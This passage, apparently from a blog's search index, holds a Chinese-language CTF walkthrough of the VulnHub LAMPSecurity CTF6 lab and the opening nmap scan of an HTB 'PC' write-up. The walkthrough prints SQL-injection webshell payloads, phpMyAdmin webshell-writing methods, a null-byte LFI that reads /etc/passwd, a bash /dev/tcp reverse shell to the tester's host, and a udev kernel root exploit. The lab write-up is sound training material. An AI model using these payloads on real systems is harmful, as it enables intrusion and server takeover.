16:06:51\t172.16.61.132 called 2009-06-29 16:06:51\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called mod=node&amp;nid=some_thing&amp;op=view2009-06-29 16:06:52\t172.16.61.132 called mod=some_thing&amp;op=browse2009-06-29 16:06:52\t172.16.61.132 called file=index.php2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:52\t172.16.61.132 called Open2009-06-29 16:06:52\t172.16.61.132 called OpenServer2009-06-29 16:06:52\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called 2009-06-29 16:06:53\t172.16.61.132 called download=/winnt/win.ini2009-06-29 16:06:53\t172.16.61.132 called download=/windows/win.ini2009-06-29 16:06:53\t172.16.61.132 called download=/etc/passwd2009-06-29 16:06:54\t172.16.61.132 called |=../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called page=../../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called page=../../../../../../../../../../boot.ini2009-06-29 16:06:54\t172.16.61.132 called l=forum/view.php&amp;topic=../../../../../../../../../etc/passwd2009-06-29 16:06:54\t172.16.61.132 called module=My_eGallery2009-06-29 16:06:54\t172.16.61.132 called option=search&amp;searchword=&lt;script&gt;alert(document.cookie);&lt;/script&gt;2009-06-29 16:06:54\t172.16.61.132 called dir=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called top_message=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;2009-06-29 16:06:55\t172.16.61.132 called file=Liens&amp;op=\\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called catid=&amp;lt;script&amp;gt;alert(&#x27;Vulnerable&#x27;)&amp;lt;/script&amp;gt;2009-06-29 16:06:55\t172.16.61.132 called action=storenew&amp;username=&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called action=search&amp;searchFor=\\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script2009-06-29 16:06:55\t172.16.61.132 called 2009-06-29 16:06:55\t172.16.61.132 called SectionID=3&amp;SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called SearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;PhraseSearchText=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;SearchContentClassID=-1&amp;SearchSectionID=-1&amp;SearchDate=-1&amp;SearchButton=Search2009-06-29 16:06:55\t172.16.61.132 called mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;op=browse2009-06-29 16:06:55\t172.16.61.132 called sql_debug=12009-06-29 16:06:55\t172.16.61.132 called sql_debug=12009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:56\t172.16.61.132 called rep=&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:56\t172.16.61.132 called 2009-06-29 16:06:57\t172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc2009-06-29 16:06:57\t172.16.61.132 called module=ew_filemanager&amp;type=admin&amp;func=manager&amp;pathext=../../../etc/&amp;view=passwd2009-06-29 16:06:57\t172.16.61.132 called err=3&amp;email=\\&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;2009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%64%69%72&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=Forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=forums&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:57\t172.16.61.132 called name=PNphpBB2&amp;file=viewtopic&amp;t=2&amp;rush=%6c%73%20%2d%61%6c&amp;highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%25272009-06-29 16:06:58\t172.16.61.132 called PageServices2009-06-29 16:06:58\t172.16.61.132 called wp-cs-dump2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:58\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:59\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called 2009-06-29 16:06:00\t172.16.61.132 called vo=\\&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;2009-06-29 16:06:00\t172.16.61.132 called showforum=1&amp;prune_day=100&amp;sort_by=Z-A&amp;sort_key=[sqlgoeshere]2009-06-29 16:06:00\t172.16.61.132 called offset=[%20Problem%20Here%20]2009-06-29 16:06:02\t172.16.61.132 called base=test%202009-06-29 16:06:03\t172.16.61.132 called IDAdmin=test2009-06-29 16:06:03\t172.16.61.132 called pymembs=admin2009-06-29 16:06:03\t172.16.61.132 called SqlQuery=test%202009-06-29 16:06:03\t172.16.61.132 called tampon=test%202009-06-29 16:06:03\t172.16.61.132 called topic=&amp;amp;lt;script&amp;amp;gt;alert(document.cookie)&amp;amp;lt;/script&amp;amp;gt;%202009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called 2009-06-29 16:06:04\t172.16.61.132 called pattern=/etc/*&amp;sort=name2009-06-29 16:06:05\t172.16.61.132 called D=A2009-06-29 16:06:05\t172.16.61.132 called N=D2009-06-29 16:06:05\t172.16.61.132 called S=A2009-06-29 16:06:05\t172.16.61.132 called M=A2009-06-29 16:06:05\t172.16.61.132 called \\&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;);&lt;/script&gt;2009-06-29 16:06:55\t172.16.61.132 called 2009-06-29 16:06:30\t172.16.61.132 called 2009-06-29 16:06:31\t172.16.61.132 called 2009-06-29 16:06:31\t172.16.61.132 called action=login2009-06-29 16:06:31\t172.16.61.132 called id=42009-06-29 16:06:31\t172.16.61.132 called id=32009-06-29 16:06:31\t172.16.61.132 called id=22009-06-29 16:06:31\t172.16.61.132 called id=12009-06-29 16:06:32\t172.16.61.132 called C=N;O=D2009-06-29 16:06:32\t172.16.61.132 called C=M;O=A2009-06-29 16:06:32\t172.16.61.132 called C=S;O=A2009-06-29 16:06:32\t172.16.61.132 called C=D;O=A2009-06-29 16:06:32\t172.16.61.132 called 2009-06-29 16:06:33\t172.16.61.132 called id=42009-06-29 16:06:33\t172.16.61.132 called action=login2009-06-29 16:06:33\t172.16.61.132 called id=32009-06-29 16:06:33\t172.16.61.132 called id=22009-06-29 16:06:34\t172.16.61.132 called id=12009-06-29 16:06:34\t172.16.61.132 called action=login2009-06-29 16:06:34\t172.16.61.132 called 2009-06-29 16:06:34\t172.16.61.132 called action=login2009-06-29 16:06:17\t172.16.61.132 called 2009-06-29 16:06:17\t172.16.61.132 called 2009-06-29 16:06:23\t172.16.61.132 called Open2009-06-29 16:06:23\t172.16.61.132 called OpenServer2009-06-29 18:06:56\t172.16.61.132 called \n看了一下日志，我们可以明显的发现这台机子显然被攻击过。仔细看看甚至里面已经有攻击者留下的后门了。\n2009-06-28 18:06:06\t172.16.61.132 called id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27\n但是他放在/tmp目录下，这该怎么访问到。。。除非有本地文件包含漏洞。我们再仔细看看日志，果然看到上一个攻击者确实在尝试LFI漏洞。\nExploit我们挑几个的试试看看有没有成功的。\n2009-06-28 18:06:13\t172.16.61.132 called actions/login.php?action=../conf/config.ini%00\n这一条不就是之前在主页登录那块的请求吗。再一想，我们甚至还有index.php的源代码在之前的备份包里。\n&lt;?php   /*** This is the index page for the sample application. * This application is meant to be part of the PHP Code Auditing * course offered by SAS Information Security.  Don *not* install* this application on a live server* * @package PHP Code Auditing * @author Justin C. Klein Keane &lt;jukeane@sas.upenn.edu&gt;* **/  //make sure the app will run!  include_once(&#x27;inc/config_check.php&#x27;);session_start();$logged_in = isset($_COOKIE[&#x27;logged_in&#x27;]) ? $_COOKIE[&#x27;logged_in&#x27;] : 0;//get configuration variables$configs = parse_ini_file(&#x27;conf/config.ini&#x27;) or die(&quot;Error parsing config file conf/config.ini&quot;);//set up loggininclude_once(&#x27;lib/log.class.php&#x27;);$log = new Log();//set up the db connection$conn = mysql_connect($configs[&#x27;database_host&#x27;], $configs[&#x27;database_user&#x27;], $configs[&#x27;database_pass&#x27;]) or $log-&gt;append(mysqlerror());mysql_select_db($configs[&#x27;database_db&#x27;]);$action = (isset($_GET[&#x27;action&#x27;])) ? $_GET[&#x27;action&#x27;] : &#x27;default&#x27;;$valid_actions = array(  &#x27;default&#x27;,   &#x27;login&#x27;,   &#x27;add_event&#x27;,   &#x27;edit_event&#x27;,   &#x27;view_event&#x27;,   &#x27;delete_event&#x27;,   &#x27;logout&#x27;,  &#x27;users&#x27;,  &#x27;logs&#x27;);//auth check$is_admin = 0;if (isset($_COOKIE[&#x27;user_id&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;hash&#x27;])) &#123;  $sql = &#x27;SELECT user_id FROM user WHERE user_id = &#x27; . $_COOKIE[&#x27;user_id&#x27;] . &#x27; AND user_password = \\&#x27;&#x27; . $_COOKIE[&#x27;hash&#x27;] . &#x27;\\&#x27;&#x27;;  $retval = mysql_query($sql) or $log-&gt;append(&quot;Problem with sql $sql &lt;hr/&gt;&quot; . mysql_error());  if (mysql_num_rows($retval) &gt; 0 )  $is_admin = 1;&#125;$admin_actions = array(&#x27;add_event&#x27;, &#x27;edit_event&#x27;, &#x27;view_event&#x27;, &#x27;delete_event&#x27;, &#x27;users&#x27;, &#x27;logs&#x27;);if (in_array($action, $admin_actions) &amp;&amp; ! $is_admin) $action = &#x27;default&#x27;;if (! in_array($action, $valid_actions)) $action = &#x27;default&#x27;;if ($action != &#x27;delete_event&#x27; &amp;&amp; $action != &#x27;logout&#x27;)   include_once(&#x27;inc/header.php&#x27;);include_once(&#x27;actions/&#x27;.$action . &#x27;.php&#x27;);include_once(&#x27;inc/footer.php&#x27;);?&gt;\n第31和62行我们可以看到，典型的LFI漏洞，但是最后有个后缀名.php。看了下PHP版本，刚好可以通过零字符截断。于是我们验证一下能不能成功\n┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]└─$ curl &#x27;http://192.168.56.140/actions/login.php?action=../../../../../../../../etc/passwd%00&#x27;root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinrpm:x:37:37::/var/lib/rpm:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologinmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bashpcap:x:77:77::/var/arpwatch:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologindovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologinjohn:x:500:500::/home/john:/bin/bashlinda:x:501:501::/home/linda:/bin/bashfred:x:502:502::/home/fred:/bin/bashmolly:x:503:503::/home/molly:/bin/bashtoby:x:504:504::/home/toby:/bin/bash\n发现，非常的OK。\n所以，按道理，我们和同行一样构造id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\\%27cmd\\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27这样一条语句就可以注入一句话木马然后通过蚁剑连接了。但是，既然都拿到phpmyadmin的管理员权限的账号了，我们不妨研究下怎么通过phpmyadmin向服务器插入webshell。上网查了查，主要三种方法能导出webshell：\n\n日志法写入\n\nRoot数据库用户（root权限）\n没有写入权限\nmagic_quotes_gpc：Off（关闭）\n\n\n\n\nshow global variables like &quot;%genera%&quot;;          //查询general_log配置以及log保存位置set global general_log=&#x27;on&#x27;;              //开启general log模式SET global general_log_file=&#x27;D:/phpStudy/WWW/cmd.php&#x27;;    //设置日志文件保存路径SELECT &#x27;&lt;?php phpinfo();?&gt;&#x27;;              //phpinfo()写入日志文件，exp写入reverse shell即可。set global general_log=&#x27;off&#x27;;              //关闭general_log模式// 访问设置的日志文件保存路径可以看到php被执行\n\n\n直接插入\n\nRoot数据库用户（root权限）\n网站绝对路径（确定有写入权限）\nmagic_quotes_gpc：Off（关闭）\n\n\n\n\nselect &#x27;&lt;?php exec(&quot;/bin/bash -c \\&#x27;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1\\&#x27;&quot;)?&gt;&#x27; INTO OUTFILE &#x27;/tmp/shell.php&#x27;;\n\n\n新建数据库插入\n1.Root数据库用户（root权限）2.网站绝对路径（确定有写入权限）3.magic_quotes_gpc：Off（开启）\n\n\n\n/*创建数据表导出shell*/CREATE TABLE `mysql`.`user1` (`content` TEXT NOT NULL );INSERT INTO `mysql`.`user1` (`content` ) VALUES (&#x27;&lt;?php @eval($_POST[x123]);?&gt;&#x27;);SELECT `content` FROM `user1` INTO OUTFILE &#x27;C:\\\\phpStudy\\\\WWW\\\\xxx.php&#x27;;DROP TABLE IF EXISTS `user1`;\n这台服务器上，general_log功能根本没有，直接第一条skip。第二条试试。发现写入不到网页的各个目录，难怪前一个攻击者是写入/tmp目录下，看了下mysql的tmpdir，果然是/tmp，这玩意是只读的，只能在配置文件里改。我们只能捏着鼻子写进/tmp目录下了。\nselect &#x27;&lt;?php exec(&quot;/bin/bash -c \\&#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.132/4444 0&gt;&amp;1\\&#x27;&quot;)?&gt;&#x27; INTO OUTFILE &#x27;/tmp/shell.php&#x27;;\n然而我们组合技还有一个文件包含，我们直接通过LFI漏洞目录遍历请求我们的shell。\n# curl 192.168.56.140/actions/login.php?action=../../../../../../../../tmp/shell.php%00  ┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 4444[sudo] password for kali: listening on [any] 4444 ...192.168.56.140: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.140] 39860bash: no job control in this shellbash-3.2$ whoami    apachebash-3.2$ ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0    inet6 fe80::20c:29ff:fe5c:7570/64 scope link        valid_lft forever preferred_lft forever3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop     link/sit 0.0.0.0 brd 0.0.0.0\n成功拿到shell。\nPrivilge Escalation上来sudo -l，find / -type f -perm -04000 -ls 2&gt;/dev/null,crontab都试过了。看了半天也没啥能用的。手动遍历下目录，/home下各用户home目录全是不可读写，想找点凭证没法了。再手动查看了下还是没啥有用的。上linpeas，上来就标红了一条内核版本。但是不是很想走内核提权。先试试别的路径。弄了半天，基本都试过一遍了，没辙了。回头看看内核提权吧。\nsh-3.2$ uname -aLinux localhost.localdomain 2.6.18-92.el5 #1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux\n在exp-db上搜了下Linux Kernal 2.6，从头开始试LPE的exp，试了快8个，都没成功，折磨疯了。上网搜了一下发现Linux 2.6是有一个著名的内核提权漏洞UDEV。按他给的步骤先查看udev的pid，然后按网上给的方法先修补一下程序。结果执行多次仍然无法成功提权。\nbash-3.2$ cat /proc/net/netlinksk       Eth Pid    Groups   Rmem     Wmem     Dump     Lockscfebce00 0   0      00000000 0        0        00000000 2cfc35a00 6   0      00000000 0        0        00000000 2cfe78600 7   0      00000000 0        0        00000000 2c1322200 9   2452   00000000 0        0        00000000 2cfe66e00 9   0      00000000 0        0        00000000 2cf557c00 10  0      00000000 0        0        00000000 2cf518c00 11  0      00000000 0        0        00000000 2cfc35400 15  568    ffffffff 0        0        00000000 2cfebcc00 15  0      00000000 0        0        00000000 2cf518a00 16  0      00000000 0        0        00000000 2cf6c0c00 18  0      00000000 0        0        00000000 2bash-3.2$ sed -i -e &#x27;s/\\r$//&#x27; kernal2.6.shbash-3.2$ chmod +x kernal2.6.shbash-3.2$ ./kernal2.6.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same file\n重试一下，切成sh试试，不知道有没有影响。\nsh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2$ ./exp.sh 568./exp.sh 568suid.c: In function &#x27;main&#x27;:suid.c:3: warning: incompatible implicit declaration of built-in function &#x27;execl&#x27;cp: `libno_ex.so.1.0&#x27; and `/tmp/libno_ex.so.1.0&#x27; are the same filesh-3.2# whoamiwhoamirootsh-3.2# ip aip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000    link/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0    inet6 fe80::20c:29ff:fe5c:7570/64 scope link        valid_lft forever preferred_lft forever3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop     link/sit 0.0.0.0 brd 0.0.0.0sh-3.2#\n多试了几次之后成功提权了。我的评价是内核提权是这样的，非常不稳定。主要这台靶机没有啥别的提权思路了，只能内核提权尝试了。\n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[HTB]  PC","url":"/2023/07/17/PC/","content":"\n\n\n\n\n前言懒得写了，干就完了。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.214Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 04:13 EDTNmap scan report for 10.10.11.214Host is up (0.074s latency).Not shown: 65533 filtered tcp ports (no-response)PORT      STATE SERVICE22/tcp    open  ssh50051/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 13.49 seconds$ sudo nmap -sT -sV -sC -O -p22,50051 10.10.11.214Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 04:38 EDTNmap scan report for 10.10.11.214Host is up (0.074s latency).PORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)50051/tcp open  unknown1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port50051-TCP:V=7.94%I=7%D=7/16%Time=64B3AC75%P=x86_64-pc-linux-gnu%r(NSF:ULL,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x0SF:6\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(GenericSF:Lines,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(GetReSF:quest,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(HTTPOSF:ptions,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0SF:\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(RTSPSF:Request,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\SF:0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(RPCSF:Check,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\SF:x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(DNSVeSF:rsionBindReqTCP,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0\\?\\SF:xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\0\\0SF:&quot;)%r(DNSStatusRequestTCP,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0SF:\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\SF:0\\0\\?\\0\\0&quot;)%r(Help,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x05\\0SF:\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0\\?\\SF:0\\0&quot;)%r(SSLSessionReq,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xff\\xff\\0\\x0SF:5\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0\\0\\0\\0\\0\\0SF:\\?\\0\\0&quot;)%r(TerminalServerCookie,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xfSF:f\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x08\\0SF:\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(TLSSessionReq,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?SF:\\xff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\0\\x01\\0\\0\\x04\\x0SF:8\\0\\0\\0\\0\\0\\0\\?\\0\\0&quot;)%r(Kerberos,2E,&quot;\\0\\0\\x18\\x04\\0\\0\\0\\0\\0\\0\\x04\\0\\?\\xSF:ff\\xff\\0\\x05\\0\\?\\xff\\xff\\0\\x06\\0\\0\\x20\\0\\xfe\\x03\\0\\0\\